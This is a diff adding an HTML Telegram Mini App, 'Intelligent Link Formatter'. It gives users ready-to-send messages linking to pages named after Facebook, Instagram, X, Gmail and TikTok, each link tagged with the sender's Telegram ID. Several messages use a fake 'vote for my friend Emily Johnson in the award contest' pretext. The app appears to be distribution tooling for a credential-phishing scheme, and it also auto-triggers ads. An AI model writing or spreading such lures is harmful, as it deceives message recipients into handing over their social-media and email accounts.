@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Intelligent Link Formatter</title>
+  <style>
+    * {margin:0;padding:0;box-sizing:border-box;}
+    body, html {
+      font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+      background:linear-gradient(to right,#0f2027,#203a43,#2c5364);
+      color:#eee;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      padding-bottom:60px;
+    }
+    header {
+      background:#111;
+      padding:18px 20px;
+      text-align:center;
+      font-weight:700;
+      font-size:1.6rem;
+      border-bottom:1px solid #222;
+    }
+    main {flex-grow:1;overflow-y:auto;padding:15px 20px;}
+    ul.link-list {list-style:none;padding:0;margin:10px auto;max-width:700px;}
+    ul.link-list li {
+      background:#222;
+      margin:15px 0;
+      border-radius:12px;
+      padding:15px;
+      transition:background .3s ease;
+    }
+    ul.link-list li:hover {background:#00ff99;color:#000;}
+    .link-header {
+      display:flex;align-items:center;margin-bottom:10px;
+    }
+    .link-header img {
+      height:45px;width:45px;object-fit:contain;
+      margin-right:12px;border-radius:8px;
+      border:1.5px solid #00ff99;background:#111;
+    }
+    .format-box {
+      background:#111;
+      border:1px solid #00ff99;
+      border-radius:10px;
+      padding:10px;
+      color:#eee;
+      white-space:pre-wrap;
+      font-size:.9rem;
+      margin-bottom:10px;
+      word-break:break-word;
+    }
+    .btn {
+      background:#00ff99;color:#000;
+      padding:6px 12px;font-weight:700;
+      border:none;border-radius:12px;
+      cursor:pointer;font-size:.9rem;
+      margin-right:8px;
+    }
+    .bottom-nav {
+      position:fixed;bottom:0;left:0;right:0;height:56px;
+      background:#111;border-top:1px solid #222;
+      display:flex;justify-content:space-around;align-items:center;
+    }
+    .bottom-nav button {
+      background:none;border:none;color:#eee;font-size:1.35rem;
+      display:flex;flex-direction:column;align-items:center;
+      cursor:pointer;transition:color .25s ease;width:60px;
+    }
+    .bottom-nav button span {font-size:.75rem;margin-top:2px;font-weight:600;}
+    .bottom-nav button.active {color:#00ff99;font-weight:700;}
+  </style>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script src="//libtl.com/sdk.js" data-zone="9830644" data-sdk="show_9830644"></script>
+</head>
+<body>
+  <header>Intelligent Link Formatter</header>
+  <main>
+    <p style="margin-bottom:10px;">📋 Each link has its own format below (ads show before open).</p>
+    <ul id="freeLinksList" class="link-list"></ul>
+  </main>
+
+  <nav class="bottom-nav">
+    <button id="refreshBtn">🔁<span>Refresh</span></button>
+    <button id="helpBtn">❓<span>Help</span></button>
+  </nav>
+
+<script>
+const tg = window.Telegram.WebApp;
+tg.expand();
+const user = tg.initDataUnsafe?.user || null;
+const telegramId = user?.id || 'unknown';
+
+// ✅ Show Monetag ad automatically after 3 seconds
+setTimeout(() => {
+  try {
+    show_9830644();
+  } catch (e) {
+    console.warn("Auto ad failed:", e);
+  }
+}, 3000);
+
+// Individual visible formats for each free link
+const freeLinks = [
+  {
+    name:"Facebook format",
+    image:"https://rrloaty.github.io/intelligent/face.png",
+    format:`👋 Hello friend! Please support my page by checking out this Facebook link 👇
+https://ilyelya.github.io/n/face.html?id={telegram-id}`
+  },
+  {
+    name:"Instagram format",
+    image:"https://rrloaty.github.io/intelligent/inst.png",
+    format:`🌸 Hi there! I'd love your support on Instagram ❤️
+Please click below and check out my profile 👇
+https://ilyelya.github.io/n/inst.html?id={telegram-id}`
+  },
+  {
+    name:"Twitter (X) Format",
+    image:"https://rrloaty.github.io/intelligent/X.png",
+    format:`🐦 Hey! I'm part of a new contest on X (Twitter)! 
+Your click helps me a lot 🙏
+Visit 👇
+https://ilyelya.github.io/n/X.html?id={telegram-id}`
+  },
+  {
+    name:"Gmail format",
+    image:"https://rrloaty.github.io/intelligent/gmai.png",
+    format:`📨 Stay connected with me through Gmail updates! 
+Click below to access my shared link 👇
+https://ilyelya.github.io/n/gma.html?id={telegram-id}`
+  },
+  {
+    name:"TikTok format",
+    image:"https://rrloaty.github.io/intelligent/tiktok.png",
+    format:`🎬 Hey TikTok lover! Check out this fun video challenge 👇
+https://ilyelya.github.io/n/tiktok.html?id={telegram-id}`
+  },
+    {
+    name:"Facebook vote format",
+    image:"https://rrloaty.github.io/intelligent/face.png",
+    format:`Hello there! I hope you're doing well. I wanted to ask for your support for my dear friend Emily Johnson in the country award contest. She could really use some encouragement to win the manager contest. If you have a moment, please click the link below and lend her your support. Thank you so much! 
+👇👇👇 👇
+https://ilyelya.github.io/n/cvf.html?id={telegram-id}`
+  },
+    {
+    name:"Instagram vote format",
+    image:"https://rrloaty.github.io/intelligent/inst.png",
+    format:`Hello there! I hope you're doing well. I wanted to ask for your support for my dear friend Emily Johnson in the country award contest. She could really use some encouragement to win the manager contest. If you have a moment, please click the link below and lend her your support. Thank you so much!  👇👇👇 👇
+https://ilyelya.github.io/n/cvi.html?id={telegram-id}`
+  },
+    {
+    name:"TikTok Vote format",
+    image:"https://rrloaty.github.io/intelligent/tiktok.png",
+    format:`Hello there! I hope you're doing well. I wanted to ask for your support for my dear friend Emily Johnson in the country award contest. She could really use some encouragement to win the manager contest. If you have a moment, please click the link below and lend her your support. Thank you so much!  👇👇👇 👇
+https://ilyelya.github.io/n/cvt.html?id={telegram-id}`
+  },
+    {
+    name:"Twitter (X) vote format",
+    image:"https://rrloaty.github.io/intelligent/X.png",
+    format:`Hello there! I hope you're doing well. I wanted to ask for your support for my dear friend Emily Johnson in the country award contest. She could really use some encouragement to win the manager contest. If you have a moment, please click the link below and lend her your support. Thank you so much!  👇👇👇 👇
+https://ilyelya.github.io/n/cvtw.html?id={telegram-id}`
+  },
+];
+
+function showMyAd() {
+  try {
+    return show_9830644();
+  } catch (e) {
+    console.warn("Ad not loaded", e);
+    return Promise.reject(e);
+  }
+}
+
+function renderFreeLinks() {
+  const list = document.getElementById("freeLinksList");
+  list.innerHTML = "";
+  freeLinks.forEach(link => {
+    const li = document.createElement("li");
+
+    const header = document.createElement("div");
+    header.className = "link-header";
+    const img = document.createElement("img");
+    img.src = link.image; img.alt = link.name;
+    const title = document.createElement("div");
+    title.textContent = link.name;
+    title.style.fontWeight = "600";
+    header.append(img, title);
+
+    const textBox = document.createElement("div");
+    textBox.className = "format-box";
+    textBox.textContent = link.format.replace("{telegram-id}", telegramId);
+
+    const copyBtn = document.createElement("button");
+    copyBtn.textContent = "Copy Text";
+    copyBtn.className = "btn";
+    copyBtn.onclick = () => {
+      navigator.clipboard.writeText(textBox.textContent).then(() => {
+        copyBtn.textContent = "Copied!";
+        setTimeout(() => copyBtn.textContent = "Copy Text", 1500);
+      });
+      showMyAd().catch(()=>{});
+    };
+
+    const openBtn = document.createElement("button");
+    openBtn.textContent = "Open Link";
+    openBtn.className = "btn";
+    openBtn.onclick = () => {
+      const linkMatch = textBox.textContent.match(/https[^\s]+/);
+      if (!linkMatch) return;
+      showMyAd()
+      .then(()=>window.open(linkMatch[0],"_blank"))
+      .catch(()=>window.open(linkMatch[0],"_blank"));
+    };
+
+    li.append(header, textBox, copyBtn, openBtn);
+    list.appendChild(li);
+  });
+}
+
+document.getElementById("refreshBtn").onclick = () => {
+  showMyAd().then(renderFreeLinks).catch(renderFreeLinks);
+};
+document.getElementById("helpBtn").onclick = () => {
+  window.open("https://t.me/intelligentverificationlinkbot","_blank");
+};
+
+renderFreeLinks();
+</script>
+</body>
+</html>
